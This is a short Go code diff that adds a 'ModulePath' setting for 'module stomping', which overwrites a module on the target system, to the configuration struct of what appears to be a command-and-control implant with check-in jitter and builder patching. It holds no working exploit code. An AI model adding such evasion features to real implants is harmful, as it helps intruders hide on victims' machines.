@@ -59,6 +59,8 @@ type Config struct {
 	PaddingMin int `cbor:"55,keyasint"`
 	PaddingMax int `cbor:"56,keyasint"`
 	Jitter     int `cbor:"57,keyasint"` // Percent jitter for check-in
+	// Module Stomping
+	ModulePath string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
 }
 
 // This will be patched by the builder
